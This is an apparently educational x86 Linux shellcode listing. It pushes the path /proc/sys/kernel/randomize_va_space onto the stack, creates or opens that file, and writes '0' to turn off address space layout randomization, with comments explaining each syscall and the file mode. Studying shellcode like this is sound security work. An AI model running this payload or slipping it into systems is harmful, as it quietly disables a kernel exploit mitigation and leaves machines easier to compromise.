global _start
section .text
  _start:
    xor    eax,eax ; Clear out eax
    push   eax     ; Push 0x00000000 onto the stack
    push   0x65636170 ; Push ecap onto the stack
    push   0x735f6176 ; Push s_av onto the stack
    push   0x5f657a69 ; Push _ezi onto the stack
    push   0x6d6f646e ; Push modn onto the stack
    push   0x61722f6c ; Push ar/l onto the stack
    push   0x656e7265 ; Push enre onto the stack
    push   0x6b2f7379 ; Push k/sy onto the stack
    push   0x732f636f ; Push s/co onto the stack
    push   0x72702f2f ; Push rp// onto the stack
    ; At this point //proc/sys/kernel/randomize_va_space
    ; Has been pushed onto the stack
    ; According to [http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization](this)
    ; This seems to be the recommended way to be disabling ASLR
    mov    ebx, esp ; place a pointer to our string on the stack

    mov    cx, 0x2bc ; mode for sys_creat call
    ; gdb --batch --ex "print /o 0x02bc" $1 = 01274
    ; consulting the man page table for mode we find
    ; S_IWUSR    00200 user has write permission
    ; S_IRWXG    00070 group has read, write, and execute permission
    ; S_IROTH    00004 others have read permission
    ; S_ISVTX  0001000 sticky bit

    mov    al, 0x8 ; sys_creat - open or create a file
    int    0x80 ; open the file

    mov    ebx,eax ; save the file descriptor
    push   eax ; push the file descriptor onto the stack

    ;; Beginning to setup the write syscall by
    ;; placing the required information into
    ;; the proper registers
    ;; ssize_t write(int fd, const void *buf, size_t count);
    mov    dx,0x3a30  ; Push :0 onto the stack
    push   dx ; push it onto the stack
    mov    ecx,esp
    xor    edx,edx
    inc    edx ; count of bytes to be written which is 1
    mov    al,0x4 ; sys_write syscall
    int    0x80

    mov    al,0x6 ; sys_close syscall
    int    0x80

    inc    eax ; sys_waitpid syscall
    int    0x80
